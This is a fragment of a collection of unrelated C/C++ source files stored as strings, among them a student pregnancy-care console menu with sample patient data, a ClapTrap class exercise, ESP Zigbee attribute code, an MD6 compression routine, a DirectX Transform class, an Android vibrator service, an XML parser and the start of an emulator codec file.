\"777-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Rudra\", \"897-444-5555\"});\r\n    nearbyDoctors.push_back({\"Dr. Sneha\", \"888-444-5555\"});\r\n\r\n    std::vector<Patient> patients;\r\n    patients.push_back({\"Ishi Dikshit\", \"20-August-2023\", \"123-456-7890\", \"Thyroid\", \"8\", \"5.2\", \"160\", \"55\", {\"Dr. Khurana\", \"789-222-3333\"}});\r\n    patients.push_back({\"Rakshita Rudra\",\"22-April-2023\", \"987-654-3210\",\"N/A\", \"5\", \"165\", \"62\",{\"Dr. Sneha\", \"888-444-5555\"} });\r\n    patients.push_back({\"Anamika Mishra\",\"20-February-2023\", \"555-123-4567\",\"PCOD\",\"9\", \"155\", \"70\",{\"Dr. Sharma\", \"986-444-5555\"}});\r\n    patients.push_back({\"Diya Roy\", \"01-April-2023\", \"789-123-4567\",\"Diabetes\", \"4\", \"162\", \"68\",{\"Dr. Rudra\", \"897-444-5555\"}});\r\n    patients.push_back({\"Priya Sharma\",\"22-july-2023\", \"987-654-3210\",\"N/A\", \"7\", \"163\", \"60\",{\"Dr. Arora\", \"987-333-4444\"}});\r\n    patients.push_back({\"Himanshi Patel\",\"07-june-2023\", \"555-777-8888\",\"Hypertension\", \"2\", \"157\", \"65\",{\"Dr. Khurana\", \"789-222-3333\"} });\r\n    patients.push_back({\"Sneha Gupta\",\"21-August-2023\", \"123-987-6543\",\"Lactose intolrance\", \"5\", \"168\", \"58\",{\"Dr. Menon\", \"777-444-5555\"} });\r\n    patients.push_back({\"Sunena Singh\",\"20-january-2023\", \"777-555-9999\", \"N/A\", \"4\", \"170\", \"70\",{\"Dr. Khurana\", \"789-222-3333\"} });\r\n    patients.push_back({\"Anita Verma\",\"16-March-2023\", \"222-333-4444\", \"Hyperthyroid\", \"8\", \"155\", \"75\",{\"Dr. Arora\", \"987-333-4444\"} });\r\n    patients.push_back({\"Maithili Mehta\",\"16-March-2023\", \"444-555-6666\",\"N/A\", \"7\", \"161\", \"63\",{\"Dr. Rudra\", \"897-444-5555\"} });\r\n    patients.push_back({\"Pooja Malhotra\",\"18-September-2023\", \"555-444-3333\",\"Allergic to Root and tubers\", \"N/A\", \"166\", \"58\", {\"Dr. Menon\", \"777-444-5555\"}});\r\n    patients.push_back({\"Mitali Sharma\",\"29-September-2023\",\"123-987-6543\",\"N/A\", \"3\", \"159\", \"62\", {\"Dr. Rudra\", \"897-444-5555\"}});\r\n\r\n    std::vector<EmergencyContacts> contacts;\r\n    contacts.push_back({\"Apollo Hospitals\",\"1066\"});\r\n    contacts.push_back({\"Fortis Healthcare\",\"105010\"});\r\n    contacts.push_back({\"Emergency Ambulance Services\",\"108\"});\r\n    \r\n    int choice;\r\n    int patientChoice;\r\n\r\n    do {\r\n        std::cout <<endl<< \"1. View patient information\\n\";\r\n        std::cout << \"2. View diet plan for pregnancy\\n\";\r\n        std::cout << \"3. View exercise plan\\n\";\r\n        std::cout << \"4. View nearby doctors\\n\";\r\n        std::cout << \"5. Book an appointment\\n\";\r\n        std::cout << \"6. View emergency contact numbers\\n\";\r\n        std::cout << \"7. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                viewPatientInfo(patients);\r\n                break;\r\n            case 2:\r\n                viewDietPlanForPregnancy();\r\n                break;\r\n            case 3:\r\n               std::cout <<endl<< \"Your exercise plan for pregnant women: ...\\n\";\r\n               std::cout << \"---------------------------------------------------------------------------\\n\";\r\n               std::cout << \"Day 1: Gentle Cardio and Balance:\\n\";\r\n               std::cout << \"       - Morning: 20 minutes of prenatal walking or stationary cycling at a moderate pace\\n\";\r\n               std::cout << \"       - Afternoon: Balance exercises (standing on one leg, wall-supported squats) for 15 minutes\\n\";\r\n               std::cout << \"       - Evening: Prenatal yoga for relaxation and balance (15-20 minutes)\\n\";\r\n               std::cout << \"---------------------------------------------------------------------------\\n\";\r\n               std::cout << \"Day 2: Rest and Relaxation:\\n\";\r\n               std::cout << \"       - Focus on rest, relaxation, and deep breathing exercises\\n\";\r\n               std::cout << \"-------------",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   ClapTrap.cpp                                       :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: alaassir <alaassir@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/01 00:30:07 by alaassir          #+#    #+#             */\n/*   Updated: 2024/05/01 01:08:32 by alaassir         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"ClapTrap.hpp\"\n\nClapTrap::ClapTrap()\n{\n\tstd::cout << \"ClapTrap default constructor is called\" << std::endl;\n\tthis->name = \"Default\";\n\tthis->hit_points = 10;\n\tthis->enrgy_points = 10;\n\tthis->attack_damage = 0;\n}\n\nClapTrap::ClapTrap(std::string _name)\n{\n\tstd::cout << \"ClapTrap parametrized constructor is called\" << std::endl;\n\tthis->name = _name;\n\tthis->hit_points = 10;\n\tthis->enrgy_points = 10;\n\tthis->attack_damage = 0;\n}\n\nClapTrap::ClapTrap(const ClapTrap &CT)\n{\n\tstd::cout << \"ClapTrap copy constructor is called\" << std::endl;\n\t*this = CT;\n}\n\nClapTrap::~ClapTrap()\n{\n\tstd::cout << \"ClapTrap destructor is called\" << std::endl;\n}\n\nClapTrap\t&ClapTrap::operator=(const ClapTrap &CT)\n{\n\tstd::cout << \"ClapTrap assignement operator is called\" << std::endl;\n\tthis->name = CT.name;\n\tthis->hit_points = CT.hit_points;\n\tthis->enrgy_points = CT.enrgy_points;\n\tthis->attack_damage = CT.attack_damage;\n\treturn (*this);\n}\n\nvoid\tClapTrap::attack(const std::string &target)\n{\n\tif (this->enrgy_points > 0)\n\t{\n\t\tstd::cout << \"ClapTrap \" << this->name << \" attacks \" << target << \\\n\t\t\", causing \" << this->attack_damage << \" points of damage!\" << std::endl;\n\t\tthis->enrgy_points--;\n\t}\n}\n\nvoid\tClapTrap::takeDamage(unsigned int amount)\n{\n\tif (amount < this->hit_points)\n\t\tthis->enrgy_points -= amount;\n\telse if (this->enrgy_points > 0)\n\t\tthis->enrgy_points = 0;\n\telse\n\t\tstd::cout << this->name << \" is already dead!\" << std::endl;\n}\n\nvoid\tClapTrap::beRepaired(unsigned int amount)\n{\n\tif (this->hit_points == 0)\n\t\tstd::cout << this->name << \" is already dead! and cannot repair itself.\" << std::endl;\n\telse if (this->enrgy_points == 0)\n\t\tstd::cout << this->name << \" don't enough energy points to repaire itself.\" << std::endl;\n\telse if (this->hit_points + amount > 10)\n\t\tstd::cout << this->name << \" can't have more than 10 hit points.\" << std::endl;\n\telse\n\t\tthis->hit_points += amount;\n}\n",
    "//#include <Arduino.h>\r\n#include \"esp_log.h\"\r\n#include \"zb_zcl.h\"\r\n#include \"zb_device.h\"\r\n\r\n#define TAG \"zb_device\"\r\n\r\nZbRuntime *g_runtime;\r\n\r\nvoid ZbDevice::leave(void)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbDevice::leave(void)\");\r\n  assert(g_runtime);\r\n  g_runtime->leave();\r\n}\r\n\r\nvoid ZbDevice::reportNow(void)\r\n{\r\n  ESP_LOGI(TAG, \"ZbDevice::reportNow(void)\");\r\n  //if(reportNowFunc) reportNowFunc();\r\n}\r\n\r\nvoid ZbDevice::appendMandatories(void)\r\n{\r\n  initZclData();\r\n  //dumpClusterInfos();\r\n  \r\n  zb_cluster_info_t *ci;\r\n  for(int iEndpoint=0; iEndpoint < getEndpointCount(); iEndpoint++) {\r\n    ZbEndpoint *ep = getEndpoint(iEndpoint);\r\n    assert(ep);\r\n    //ESP_LOGI(TAG, \"Endpoint %02X\", ep->getId());\r\n    for(int iCluster=0; iCluster < ep->getClusterCount(); iCluster++) {\r\n      ZbCluster *cluster = ep->getCluster(iCluster);\r\n      assert(cluster);\r\n      //ESP_LOGI(TAG, \"cluster %04X\", cluster->getId());\r\n      zb_cluster_info_t *ci = findClusterInfo(cluster->getId());\r\n      //ESP_LOGI(TAG, \"ci %04X\", ci);\r\n      if(ci) {\r\n        for(int iAttribute=0; iAttribute < ci->attrCount; iAttribute++) {\r\n          zb_attr_info_t *ai = &ci->attrs[iAttribute];\r\n          if(ai->mandatory && !cluster->findAttribute(ai->attrId)) {\r\n            //ESP_LOGI(TAG, \"Append clusterId=%04X, attrId=%04X, attrAccess=%02X\", ci->clusterId, ai->attrId, ai->attrAccess);\r\n            ZbAttribute *attr = new ZbAttribute(*cluster, ai->attrId, ai->attrType, ai->attrAccess, ai->defaultValue);\r\n          }\r\n        }\r\n      } \r\n    }\r\n  } \r\n  //ESP_LOGI(TAG, \"exit appendMandatories()\"); \r\n}\r\n\r\nZbEndpoint* ZbDevice::findEndpoint(uint8_t id) {\r\n  for(int iEndpoint=0; iEndpoint < m_endpointCount; iEndpoint++) {\r\n    if(m_endpoints[iEndpoint]->getId() == id) \r\n      return m_endpoints[iEndpoint];\r\n  }\r\n  return NULL;\r\n}\r\n\r\nZbCluster* ZbEndpoint::findCluster(uint16_t id) {\r\n  for(int iCluster=0; iCluster < m_clusterCount; iCluster++) {\r\n    if(m_clusters[iCluster]->getId() == id) \r\n      return m_clusters[iCluster];\r\n  }\r\n  return NULL;\r\n}\r\n\r\nZbAttribute* ZbCluster::findAttribute(uint16_t id) {\r\n  for(int iAttribute=0; iAttribute < m_attrCount; iAttribute++) {\r\n    if(m_attributes[iAttribute]->getId() == id) \r\n      return m_attributes[iAttribute];\r\n  }\r\n  return NULL;\r\n}\r\n\r\nvoid ZbAttribute::report(void)\r\n{\r\n  if(getDevice()->joined()) {\r\n    assert(g_runtime);\r\n    esp_zb_zcl_status_t state_tmp = (esp_zb_zcl_status_t) g_runtime->reportAttribute(getEndpoint()->getId(), getCluster()->getId(), m_id);\r\n  }\r\n}\r\n\r\nvoid ZbAttribute::updateValue(void)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbAttribute::updateValue(void)\");\r\n  // !!! \u043f\u0438\u0441\u0430\u0442\u044c \u0432 \u0430\u0442\u0440\u0438\u0431\u0443\u0442 \u043d\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0438, \u0430 \u0432 \u043b\u044e\u0431\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435 \u043f\u043e\u0441\u043b\u0435 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0430\u0442\u0440\u0438\u0431\u0443\u0442\u043e\u0432 \u0447\u0435\u0440\u0435\u0437 SDK\r\n  if(getDevice()->joined()) {  \r\n    assert(g_runtime);\r\n    ESP_LOGI(TAG, \"g_runtime->setAttributeValue endpoint=%d clusterId=0x%04X attrId=0x%04X: 0x%02X\", getEndpoint()->getId(), getCluster()->getId(), m_id, *m_data);\r\n    esp_zb_zcl_status_t err = (esp_zb_zcl_status_t) g_runtime->setAttributeValue(getEndpoint()->getId(), getCluster()->getId(), getCluster()->getRole(), m_id, m_data, false);\r\n    if(err != ESP_ZB_ZCL_STATUS_SUCCESS)\r\n      ESP_LOGE(TAG, \"Setting attribute failed (%04X)!\", err);\r\n    else \r\n      ESP_LOGI(TAG, \"Setting attribute success.\");\r\n  }\r\n}\r\n\r\nvoid ZbAttribute::setValue(int32_t value)\r\n{\r\n//  ESP_LOGI(TAG, \"ZbAttribute::setValue(uint8_t value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  m_intData = (uint32_t) value;\r\n  m_data = (uint8_t *) &m_intData;\r\n  m_dataOwned = false;\r\n  updateValue();\r\n}\r\n\r\nvoid ZbAttribute::setValue(uint32_t value)\r\n{\r\n//  ESP_LOGI(TAG, \"ZbAttribute::setValue(uint8_t value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  m_intData = value;\r\n  m_data = (uint8_t *) &m_intData;\r\n  m_dataOwned = false;\r\n  updateValue();\r\n}\r\n\r\nvoid ZbAttribute::setValue(float value)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbAttribute::setValue(float value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  m_floatData = value;\r\n  m_data = (uint8_t *) &m_floatData;\r\n  m_dataOwned = false;\r\n  updateValue();\r\n}\r\n\r\nvoid ZbAttribute::setValue(char* value)\r\n{\r\n  //ESP_LOGI(TAG, \"ZbAttribute::setValue(char* value)\");\r\n  if (m_data && m_dataOwned) free(m_data);\r\n  if(m_type == ESP_ZB_ZCL_ATTR_TYPE_CHAR_STRING || m_type == ESP_ZB_ZCL_ATTR_TYPE_OCTET_STRING) { // \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u044c!!!\r\n    int len = strlen(value);\r\n    m_data = (uint8_t *) malloc(len + 1);\r\n    m_data[0] = len;\r\n    memcpy(m_data + 1, value, len);\r\n    m_dataOwned = true;\r\n  }\r\n  else {\r\n    m_data = (uint8_t *) value;\r\n    m_dataOwned = false;\r\n  }\r\n  updateValue();\r\n}\r\n",
    "\ufeff/*-----------------------------------------------------------------------------------------\n**\n** Copyright: Juliana, 2024~\n**\n** Filename: main.cpp\n**\n** Description: This File defines the entry of the application\n** \n** Including Function:\n**\t\tmain\n**\n** Design Annotation:\n**\n** Author:\n**\t\tJuliana, start writing this file in May 2024\n**\n** Modification History:\n**\t\tMay 2nd 2024, create this file\n**\t\t$Revision$\n**\t\t$Date$\n**\t\t$Author$\n**\t\t$Log$\n**\n**-----------------------------------------------------------------------------------------\n*/\n/*-----------------------------------------------------------------------------------------\n**\t\t\t\t\t\t\t\t\t\t  Include\n**-----------------------------------------------------------------------------------------\n*/\n#include \"twoSum.h\"\n\nusing namespace TwoSum;\n\n/*-----------------------------------------------------------------------------------------\n**\t\t\t\t\t\t\t\t\tFunction Definition\n**-----------------------------------------------------------------------------------------\n*/\n/*.BH--------------------------------------------------------------------------------------\n**\n** Function Name: main\n** \n** Description: This function defines the entry of the application\n** \n** Input Parameter:\n**\n** Output Parameter:\n**\n** Return Value:\n**\n** Design Annotation:\n** \n** Modification History:\n**\t\tMay 2nd 2024, create this function\n** \n**.EH--------------------------------------------------------------------------------------\n*/\nint main(void)\n{\n\tTwoSum::Solution::test();\n\n\treturn 0;\n}\n/* END of main */\n",
    "#include <cstdlib>\n#include <cstring>\n#include \"md6.h\"\n\n// Define constants\n#define w md6_w\n#define n md6_n\n#define c md6_c\n#define b md6_b\n#define v md6_v\n#define u md6_u\n#define k md6_k\n#define q md6_q\n\nint RL[16][2] = {\n        {10, 11}, {5, 24}, {13, 9}, {10, 16}, {11, 15}, {12, 9},\n        {2, 27}, {7, 15}, {14, 6}, {15, 2}, {7, 29}, {13, 8},\n        {11, 15}, {7, 5}, {6, 31}, {12, 9}\n};\n\n// Main compression loop\nstatic void md6_main_compression_loop(md6_word *A, int r) {\n    md6_word x, S = 0x0123456789abcdefULL;\n    int i = n;\n\n    for (int j = 0; j < r * c; j += c) {\n        for (int step = 0; step < 16; step++) {\n            x = S;\n            x ^= A[i + step - 89];\n            x ^= A[i + step - 17];\n            x ^= (A[i + step - 18] & A[i + step - 21]);\n            x ^= (A[i + step - 31] & A[i + step - 67]);\n            x ^= (x >> RL[step][0]);\n            A[i + step] = x ^ (x << RL[step][1]);\n        }\n        S = (S << 1) ^ (S >> (w - 1)) ^ (S & 0x7311c2812425cfa0ULL);\n        i += 16;\n    }\n}\n\n// Compression function\nstatic int md6_compress(md6_word *C, md6_word *N, int r, md6_word *A) {\n    if (!N || !C || r < 0 || r > md6_max_r) return MD6_BAD_r;\n\n    md6_word *A_as_given = A;\n    if (!A) {\n        A = (md6_word *) calloc(r * c + n, sizeof(md6_word));\n        if (!A) return MD6_OUT_OF_MEMORY;\n    }\n\n    memcpy(A, N, n * sizeof(md6_word));\n    md6_main_compression_loop(A, r);\n    memcpy(C, A + (r - 1) * c + n, c * sizeof(md6_word));\n\n    if (!A_as_given) {\n        memset(A, 0, (r * c + n) * sizeof(md6_word));\n        free(A);\n    }\n\n    return MD6_SUCCESS;\n}\n\n// Create control word\nstatic md6_control_word md6_make_control_word(int r, int L, int z, int p, int keylen, int d) {\n    return (((md6_control_word) 0 << 60) |\n            ((md6_control_word) r << 48) |\n            ((md6_control_word) L << 40) |\n            ((md6_control_word) z << 36) |\n            ((md6_control_word) p << 20) |\n            ((md6_control_word) keylen << 12) |\n            (md6_control_word) d);\n}\n\n// Standard compress function\nint md6_standard_compress(md6_word *C, const md6_word *Q, const md6_word *K, int ell, int i, int r, int L, int z,\n                                 int p, int keylen, int d, md6_word *B) {\n    if (!C || !B || !K || !Q) return MD6_NULL_C;\n    if (r < 0 || r > md6_max_r || L < 0 || L > 255 || ell < 0 || ell > 255\n        || p < 0 || p > b * w || d <= 0 || d > c * w / 2)\n        return MD6_BAD_r;\n\n    md6_word N[md6_n];\n    md6_word A[5000];\n\n    // Pack\n    int ni = 0;\n\n    for (int j = 0; j < q; j++) N[ni++] = Q[j];\n    for (int j = 0; j < k; j++) N[ni++] = K[j];\n\n    md6_nodeID U = ((md6_nodeID) ell << 56) | i;\n    memcpy((unsigned char *) &N[ni], &U, min(u * (w / 8), sizeof(md6_nodeID)));\n    ni += u;\n\n    md6_control_word V = md6_make_control_word(r, L, z, p, keylen, d);\n    memcpy((unsigned char *) &N[ni], &V, min(v * (w / 8), sizeof(md6_control_word)));\n    ni += v;\n\n    memcpy(N + ni, B, b * sizeof(md6_word));\n\n    return md6_compress(C, N, r, A);\n}\n",
    "#include \"Transform.h\"\n\nusing namespace DirectX;\n\n#pragma region === CONSTRUCTORS ===\nTransform::Transform() : Transform(XMFLOAT3(0, 0, 0), XMFLOAT3(0, 0, 0), XMFLOAT3(1, 1, 1))\n{\n}\n\nTransform::Transform(DirectX::XMFLOAT3 position, DirectX::XMFLOAT4 rotation, DirectX::XMFLOAT3 scale) \n    : position(position),\n    rotation(rotation),\n    scale(scale)\n{\n    XMStoreFloat4x4(&worldMatrix, XMMatrixIdentity());\n    XMStoreFloat4x4(&worldInverseTransposeMatrix, XMMatrixIdentity());\n    transformAltered = true;\n    UpdateRotation();\n}\n\nTransform::Transform(DirectX::XMFLOAT3 position, DirectX::XMFLOAT3 pitchYawRoll, DirectX::XMFLOAT3 scale)\n    : Transform(position, XMFLOAT4(0, 0, 0, 0), scale)\n{\n    SetRotation(pitchYawRoll);\n    UpdateRotation();\n}\n\nTransform::~Transform()\n{\n}\n#pragma endregion\n\n\n#pragma region === GETTERS ===\nDirectX::XMFLOAT3* Transform::GetPosition()\n{\n    return &position;\n}\n\nDirectX::XMFLOAT4* Transform::GetRotation()\n{\n    return &rotation;\n}\n\nDirectX::XMFLOAT3* Transform::GetScale()\n{\n    return &scale;\n}\n\nDirectX::XMFLOAT4X4 Transform::GetWorldMatrix()\n{\n    if (transformAltered)\n        UpdateMatrices();\n\n    return worldMatrix;\n}\n\nDirectX::XMFLOAT4X4 Transform::GetWorldInverseTransposeMatrix()\n{\n    if (transformAltered)\n        UpdateMatrices();\n\n    return worldInverseTransposeMatrix;\n}\nDirectX::XMFLOAT3* Transform::GetRight()\n{\n    if (rotationAltered)\n        UpdateRotation();\n\n    return &right;\n}\nDirectX::XMFLOAT3* Transform::GetUp()\n{\n    if (rotationAltered)\n        UpdateRotation();\n\n    return &up;\n}\nDirectX::XMFLOAT3* Transform::GetForward()\n{\n    if (rotationAltered)\n        UpdateRotation();\n\n    return &forward;\n}\nfloat Transform::GetPitch()\n{\n    return pitch;\n}\nfloat Transform::GetYaw()\n{\n    return yaw;\n}\n#pragma endregion\n\n\n\n#pragma region === SETTERS ===\nvoid Transform::SetPosition(DirectX::XMFLOAT3 newPos)\n{\n    position = newPos;\n    transformAltered = true;\n}\n\nvoid Transform::SetPosition(float x, float y, float z)\n{\n    position = XMFLOAT3(x, y, z);\n    transformAltered = true;\n}\n\nvoid Transform::SetRotation(DirectX::XMFLOAT3 newPitchYawRoll)\n{\n    XMStoreFloat4(&rotation, XMQuaternionRotationRollPitchYawFromVector(XMLoadFloat3(&newPitchYawRoll)));\n    transformAltered = true;\n    rotationAltered = true;\n}\n\nvoid Transform::SetRotation(float pitch, float yaw, float roll)\n{\n    XMStoreFloat4(&rotation, XMQuaternionRotationRollPitchYaw(pitch, yaw, roll));\n    transformAltered = true;\n    rotationAltered = true;\n}\n\nvoid Transform::SetRotation(DirectX::XMFLOAT4 newQuaternion)\n{\n    rotation = newQuaternion;\n    transformAltered = true;\n    rotationAltered = true;\n}\n\nvoid Transform::SetScale(DirectX::XMFLOAT3 newScale)\n{\n    scale = newScale;\n    transformAltered = true;\n}\n\nvoid Transform::SetScale(float x, float y, float z)\n{\n    scale = XMFLOAT3(x, y, z);\n    transformAltered = true;\n}\n#pragma endregion\n\n\n\n#pragma region === MUTATORS ===\nvoid Transform::MoveBy(DirectX::XMFLOAT3 offset)\n{\n    XMStoreFloat3(&position, XMVectorAdd(XMLoadFloat3(&position), XMLoadFloat3(&offset)));\n    transformAltered = true;\n}\n\nvoid Transform::MoveBy(float x, float y, float z)\n{\n    XMStoreFloat3(&position, XMVectorAdd(XMLoadFloat3(&position), XMVectorSet(x, y, z, 0)));\n    transformAltered = true;\n}\n\nvoid Transform::LocalMoveBy(DirectX::XMFLOAT3 offset)\n{\n    XMStoreFloat3(&position, XMVectorAdd(XMLoadFloat3(&position), XMVector3Rotate(XMLoadFloat3(&offset), XMLoadFloat4(&rotation))));\n    transformAltered = true;\n}\n\nvoid Transform::LocalMoveBy(float x, float y, float z)\n{\n    XMStoreFloat3(&position, XMVectorAdd(XMLoadFloat3(&position), XMVector3Rotate(XMVectorSet(x, y, z, 0), XMLoadFloat4(&rotation))));\n    transformAltered = true;\n}\n\nvoid Transform::RotateBy(DirectX::XMFLOAT4 quaternion)\n{\n    XMStoreFloat4(&rotation, XMQuaternionMultiply(XMLoadFloat4(&rotation), XMLoadFloat4(&quaternion)));\n    transformAltered = true;\n    rotationAltered = true;\n}\n\nvoid Transform::RotateBy(DirectX::XMFLOAT3 pitchYawRoll)\n{\n    XMStoreFloat4(&rotation, XMQuaternionMultiply(XMLoadFloat4(&rotation), XMQuaternionRotationRollPitchYawFromVector(XMLoadFloat3(&pitchYawRoll))));\n    transformAltered = true;\n    rotationAltered = true;\n}\n\nvoid Transform::RotateBy(float pitch, float yaw, float roll)\n{\n    XMStoreFloat4(&rotation, XMQuaternionMultiply(XMLoadFloat4(&rotation), XMQuaternionRotationRollPitchYaw(pitch, yaw, roll)));\n    transformAltered = true;\n    rotationAltered = true;\n\n}\n\nvoid Transform::ScaleBy(DirectX::XMFLOAT3 scaleFactor)\n{\n    XMStoreFloat3(&scale, XMVectorMultiply(XMLoadFloat3(&scale), XMLoadFloat3(&scaleFactor)));\n    transformAltered = true;\n}\n\nvoid Transform::ScaleBy(float x, float y, float z)\n{\n    XMStoreFloat3(&scale, XMVectorMultiply(XMLoadFloat3(&scale), XMVectorSet(x, y, z, 0)));\n    transformAltered = true;\n}\n#pragma endregion\n\n\n\nvoid Transform::UpdateMatrices()\n{\n    XMMATRIX t = XMMatrixTranslationFromVector(XMLoadFloat3(&position));\n    XMMATRIX r = XMMatrixRotationQuaternion",
    "/*\n * Copyright (c) 2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n#define LOG_TAG \"vendor.qti.hardware.vibrator.service\"\n\n#include <android-base/logging.h>\n#include <android/binder_manager.h>\n#include <android/binder_process.h>\n\n#include \"Vibrator.h\"\n\nusing aidl::android::hardware::vibrator::Vibrator;\n\nint main() {\n    ABinderProcess_setThreadPoolMaxThreadCount(0);\n    std::shared_ptr<Vibrator> vib = ndk::SharedRefBase::make<Vibrator>();\n\n    const std::string instance = std::string() + Vibrator::descriptor + \"/default\";\n    binder_status_t status = AServiceManager_addService(vib->asBinder().get(), instance.c_str());\n    CHECK(status == STATUS_OK);\n\n    ABinderProcess_joinThreadPool();\n    return EXIT_FAILURE;  // should not reach\n}\n",
    "#include \"xmlparser.h\"\n#include \"xmldocument.h\"\n\n#include <spdlog/spdlog.h>\n#include <expat.h>\n\nnamespace plutobook {\n\nXMLParser::XMLParser(XMLDocument* document)\n    : m_document(document)\n    , m_currentNode(document)\n{\n}\n\ninline XMLParser* getParser(void* userData)\n{\n    return (XMLParser*)(userData);\n}\n\nstatic void startElementCallback(void* userData, const XML_Char* name, const XML_Char** attrs)\n{\n    getParser(userData)->handleStartElement((const char*)(name), (const char**)(attrs));\n}\n\nstatic void endElementCallback(void* userData, const XML_Char* name)\n{\n    getParser(userData)->handleEndElement((const char*)(name));\n}\n\nstatic void characterDataCallback(void* userData, const XML_Char* data, int length)\n{\n    getParser(userData)->handleCharacterData((const char*)(data), (size_t)(length));\n}\n\nconstexpr XML_Char kXmlNamespaceSep = 1;\n\nbool XMLParser::parse(const std::string_view& content)\n{\n    auto parser = XML_ParserCreateNS(NULL, kXmlNamespaceSep);\n    XML_SetUserData(parser, this);\n    XML_SetElementHandler(parser, startElementCallback, endElementCallback);\n    XML_SetCharacterDataHandler(parser, characterDataCallback);\n    auto status = XML_Parse(parser, content.data(), content.length(), XML_TRUE);\n    auto error = XML_GetErrorCode(parser);\n    if(status == XML_STATUS_OK && error == XML_ERROR_NONE) {\n        m_document->finishParsingDocument();\n        XML_ParserFree(parser);\n        return true;\n    }\n\n    spdlog::error(\"expat error: {} on line {}, column {}\", XML_ErrorString(error), XML_GetCurrentLineNumber(parser ), XML_GetCurrentColumnNumber(parser));\n    XML_ParserFree(parser);\n    return false;\n}\n\nclass QualifiedName {\npublic:\n    QualifiedName(const GlobalString& namespaceURI, const GlobalString& localName)\n        : m_namespaceURI(namespaceURI), m_localName(localName)\n    {}\n\n    const GlobalString& namespaceURI() const { return m_namespaceURI; }\n    const GlobalString& localName() const { return m_localName; }\n\n    static QualifiedName parse(const std::string_view& name);\n\nprivate:\n    GlobalString m_namespaceURI;\n    GlobalString m_localName;\n};\n\nQualifiedName QualifiedName::parse(const std::string_view& name)\n{\n    auto index = name.find(kXmlNamespaceSep);\n    if(index == std::string_view::npos)\n        return QualifiedName(emptyGlo, GlobalString(name));\n    GlobalString namespaceURI(name.substr(0, index));\n    GlobalString localName(name.substr(index + 1));\n    return QualifiedName(namespaceURI, localName);\n}\n\nvoid XMLParser::handleStartElement(const char* name, const char** attrs)\n{\n    auto tagName = QualifiedName::parse(name);\n    auto element = m_document->createElement(tagName.namespaceURI(), tagName.localName());\n    while(attrs && *attrs) {\n        auto attrName = QualifiedName::parse(attrs[0]);\n        auto attrValue = m_document->heap()->createString(attrs[1]);\n        element->setAttribute(attrName.localName(), attrValue);\n        attrs += 2;\n    }\n\n    m_currentNode->appendChild(element);\n    m_currentNode = element;\n}\n\nvoid XMLParser::handleEndElement(const char* name)\n{\n    m_currentNode = m_currentNode->parentNode();\n}\n\nvoid XMLParser::handleCharacterData(const char* data, size_t length)\n{\n    std::string_view content(data, length);\n    if(auto lastTextNode = to<TextNode>(m_currentNode->lastChild())) {\n        lastTextNode->appendData(content);\n    } else {\n        m_currentNode->appendChild(m_document->createTextNode(content));\n    }\n}\n\n} // namespace plutobook\n",
    "// SPDX-FileCopyrightText: Copyright 2020 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"common/assert.h\"\n#include \"common/settings.h\"\n#include \"video_core/host1x/codecs/codec.h\"\n#include \"video_core/host1x/codecs/h264.h\"\n#include \"video_core/host1x/codecs/vp8.h\"\n#include \"video_core/host1x/codecs/vp9.h\"\n#include \"video_core/host1x/host1x.h\"\n#include \"video_core/memory_manager.h\"\n\nnamespace Tegra {\n\nCodec::Codec(Host1x::Host1x& host1x_, const Host1x::NvdecCommon::NvdecRegisters& regs)\n    : host1x(host1x_), state{regs}, h264_decoder(std::make_unique<Decoder::H264>(host1x)),\n      vp8_decoder(std::make_unique<Decoder::VP8>(host1x)),\n      vp9_decoder(std::make_unique<Decoder::VP9>(host1x)) {}\n\nCodec::~Codec() = default;\n\nvoid Codec::Initialize() {\n    initialized = decode_api.Initialize(current_codec);\n}\n\nvoid Codec::SetTargetCodec(Host1x::NvdecCommon::VideoCodec codec) {\n    if 